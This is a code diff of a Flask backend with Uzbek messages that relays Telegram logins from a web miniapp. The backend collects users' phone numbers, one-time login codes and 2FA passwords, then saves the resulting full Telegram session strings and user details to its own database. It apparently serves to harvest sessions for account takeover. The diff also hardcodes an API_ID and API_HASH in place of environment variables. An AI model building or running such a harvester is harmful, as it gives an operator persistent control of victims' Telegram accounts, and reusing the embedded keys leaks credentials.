@@ -1,14 +1,17 @@
 import os
 import asyncio
-from flask import Flask, request, jsonify, render_template
 import re
+from flask import Flask, request, jsonify, render_template
+
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
     PhoneCodeInvalidError,
     SessionPasswordNeededError,
+    PasswordHashInvalidError,
     FloodWaitError
 )
+
 from database import (
     save_login_attempt,
     get_login_attempt,
@@ -16,28 +19,35 @@ from database import (
     save_user,
     save_user_session
 )
-from telethon import TelegramClient
-from telethon.sessions import StringSession
-from telethon.errors import (
-    PhoneCodeInvalidError,
-    SessionPasswordNeededError,
-    PasswordHashInvalidError
-)
-
 
 # =====================
 # CONFIG
 # =====================
-API_ID = int(os.getenv("API_ID", "0"))
-API_HASH = os.getenv("API_HASH")
+API_ID = 25780325
+API_HASH = "2c4cb6eee01a46dc648114813042c453"
 
-if not API_ID or not API_HASH:
-    raise RuntimeError("API_ID yoki API_HASH yo‘q")
+# =====================
+# ASYNC LOOP (BITTA!)
+# =====================
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
+def run(coro):
+    return loop.run_until_complete(coro)
 
 # =====================
 # APP
 # =====================
 app = Flask(__name__, template_folder="templates")
+
+# =====================
+# HELPERS
+# =====================
+def clean_phone(phone: str) -> str:
+    phone = re.sub(r"\D", "", phone)
+    if not phone.startswith("998") or len(phone) != 12:
+        raise ValueError("Telefon formati noto‘g‘ri")
+    return "+" + phone
 
 # =====================
 # ROUTES
@@ -50,134 +60,105 @@ def index():
 def miniapp():
     return render_template("login.html")
 
+# =====================
+# SEND CODE
+# =====================
 @app.route("/send_code", methods=["POST"])
 def send_code():
     data = request.json or {}
-    phone = data.get("phone")
+    phone_raw = data.get("phone")
 
-    if not phone:
-        return jsonify({
-            "status": "error",
-            "message": "Telefon raqam yuborilmadi"
-        }), 400
+    if not phone_raw:
+        return jsonify({"status": "error", "message": "Telefon yo‘q"}), 400
 
-    # 🔥 1. TELEFONNI TOZALASH (ENG MUHIM JOY)
-    phone_clean = re.sub(r"\D", "", phone)
+    try:
+        phone = clean_phone(phone_raw)
 
-    if not phone_clean.startswith("998") or len(phone_clean) != 12:
-        return jsonify({
-            "status": "error",
-            "message": "Telefon formati noto‘g‘ri. Masalan: +998901234567"
-        }), 400
+        async def _send_code():
+            client = TelegramClient(StringSession(), API_ID, API_HASH)
+            await client.connect()
 
-    phone_clean = "+" + phone_clean
-
-    async def _send_code():
-        client = TelegramClient(
-            StringSession(),
-            API_ID,
-            API_HASH
-        )
-
-        await client.connect()
-
-        try:
-            sent = await client.send_code_request(phone_clean)
-
-            # 🔐 session + hash ni saqlaymiz
+            sent = await client.send_code_request(phone)
             session_string = client.session.save()
 
             save_login_attempt(
-                phone=phone_clean,
+                phone=phone,
                 phone_code_hash=sent.phone_code_hash,
                 session_string=session_string
             )
 
-        finally:
             await client.disconnect()
 
-    try:
-        asyncio.run(_send_code())
-
-        return jsonify({
-            "status": "ok"
-        }), 200
+        run(_send_code())
+        return jsonify({"status": "ok"}), 200
 
     except FloodWaitError as e:
         return jsonify({
             "status": "error",
-            "message": f"Telegram vaqtincha blok qo‘ydi. {e.seconds} soniya kuting."
+            "message": f"Telegram cheklovi: {e.seconds} soniya"
         }), 429
+
+    except ValueError as e:
+        return jsonify({"status": "error", "message": str(e)}), 400
 
     except Exception as e:
         print("SEND_CODE ERROR:", repr(e))
-        return jsonify({
-            "status": "error",
-            "message": "Kod yuborishda server xatosi"
-        }), 500
+        return jsonify({"status": "error"}), 500
 
 # =====================
 # VERIFY CODE
 # =====================
 @app.route("/verify_code", methods=["POST"])
 def verify_code():
-    data = request.json
-    phone = data.get("phone")
+    data = request.json or {}
+    phone_raw = data.get("phone")
     code = data.get("code")
 
-    if not phone or not code:
-        return jsonify({
-            "status": "error",
-            "message": "Telefon yoki kod yo‘q"
-        }), 400
+    if not phone_raw or not code:
+        return jsonify({"status": "error"}), 400
 
-    # 1️⃣ login_attempts dan HASH + SESSION olamiz
-    attempt = get_login_attempt(phone)
-    if not attempt:
-        return jsonify({
-            "status": "error",
-            "message": "Kod muddati o‘tgan yoki topilmadi"
-        }), 400
+    try:
+        phone = clean_phone(phone_raw)
+        attempt = get_login_attempt(phone)
 
-    phone_code_hash, session_string = attempt
+        if not attempt:
+            return jsonify({
+                "status": "error",
+                "message": "Kod muddati o‘tgan"
+            }), 400
 
-    async def _verify():
-        client = TelegramClient(
-            StringSession(session_string),
-            API_ID,
-            API_HASH
-        )
-        await client.connect()
+        phone_code_hash, session_string = attempt
 
-        try:
-            await client.sign_in(
-                phone=phone,
-                code=code,
-                phone_code_hash=phone_code_hash
+        async def _verify():
+            client = TelegramClient(
+                StringSession(session_string),
+                API_ID,
+                API_HASH
             )
+            await client.connect()
+
+            try:
+                await client.sign_in(
+                    phone=phone,
+                    code=code,
+                    phone_code_hash=phone_code_hash
+                )
+            except SessionPasswordNeededError:
+                return None, client.session.save()
 
             user = await client.get_me()
             final_session = client.session.save()
-
+            await client.disconnect()
             return user, final_session
 
-        finally:
-            await client.disconnect()
+        user, final_session = run(_verify())
 
-    try:
-        user, final_session = asyncio.get_event_loop().run_until_complete(_verify())
+        # ===== 2FA =====
+        if user is None:
+            return jsonify({"status": "2fa_required"}), 200
 
-        # 2️⃣ USER SESSION saqlaymiz (ENG MUHIM QISM)
         save_user_session(user.id, final_session)
-
-        # 3️⃣ USER METADATA (adminbot/stat uchun)
-        save_user(
-            user_id=user.id,
-            phone=phone,
-            username=user.username
-        )
-
-        # 4️⃣ LOGIN ATTEMPT tozalaymiz
+        save_user(user.id, phone, user.username)
         delete_login_attempt(phone)
 
         return jsonify({"status": "ok"}), 200
@@ -188,76 +169,49 @@ def verify_code():
             "message": "Kod noto‘g‘ri"
         }), 400
 
-    except SessionPasswordNeededError:
-        return jsonify({
-            "status": "2fa_required"
-        }), 200
-
     except Exception as e:
         print("VERIFY_CODE ERROR:", repr(e))
-        return jsonify({
-            "status": "error",
-            "message": "Telegram login xatosi"
-        }), 500
+        return jsonify({"status": "error"}), 500
 
-from telethon.errors import PasswordHashInvalidError
-
+# =====================
+# VERIFY PASSWORD (2FA)
+# =====================
 @app.route("/verify_password", methods=["POST"])
 def verify_password():
-    data = request.json
-    phone = data.get("phone")
+    data = request.json or {}
+    phone_raw = data.get("phone")
     password = data.get("password")
 
-    if not phone or not password:
-        return jsonify({
-            "status": "error",
-            "message": "Telefon yoki parol yo‘q"
-        }), 400
-
-    # 1️⃣ login_attempts dan session olamiz
-    attempt = get_login_attempt(phone)
-    if not attempt:
-        return jsonify({
-            "status": "error",
-            "message": "Login sessiya topilmadi"
-        }), 400
-
-    phone_code_hash, session_string = attempt
-
-    async def _verify_password():
-        client = TelegramClient(
-            StringSession(session_string),
-            API_ID,
-            API_HASH
-        )
-        await client.connect()
-
-        try:
-            await client.sign_in(password=password)
-
-            user = await client.get_me()
-            final_session = client.session.save()
-
-            return user, final_session
-
-        finally:
-            await client.disconnect()
+    if not phone_raw or not password:
+        return jsonify({"status": "error"}), 400
 
     try:
-        user, final_session = asyncio.get_event_loop().run_until_complete(
-            _verify_password()
-        )
+        phone = clean_phone(phone_raw)
+        attempt = get_login_attempt(phone)
 
-        # 🔐 USER SESSION saqlaymiz
+        if not attempt:
+            return jsonify({"status": "error"}), 400
+
+        _, session_string = attempt
+
+        async def _verify_password():
+            client = TelegramClient(
+                StringSession(session_string),
+                API_ID,
+                API_HASH
+            )
+            await client.connect()
+
+            await client.sign_in(password=password)
+            user = await client.get_me()
+            final_session = client.session.save()
+            await client.disconnect()
+            return user, final_session
+
+        user, final_session = run(_verify_password())
+
         save_user_session(user.id, final_session)
-
-        # 👤 USER METADATA
-        save_user(
-            user_id=user.id,
-            phone=phone,
-            username=user.username
-        )
-
+        save_user(user.id, phone, user.username)
         delete_login_attempt(phone)
 
         return jsonify({"status": "ok"}), 200
@@ -270,12 +224,7 @@ def verify_password():
 
     except Exception as e:
         print("VERIFY_PASSWORD ERROR:", repr(e))
-        return jsonify({
-            "status": "error",
-            "message": "2FA login xatosi"
-        }), 500
-
-
+        return jsonify({"status": "error"}), 500
 
 # =====================
 # RUN
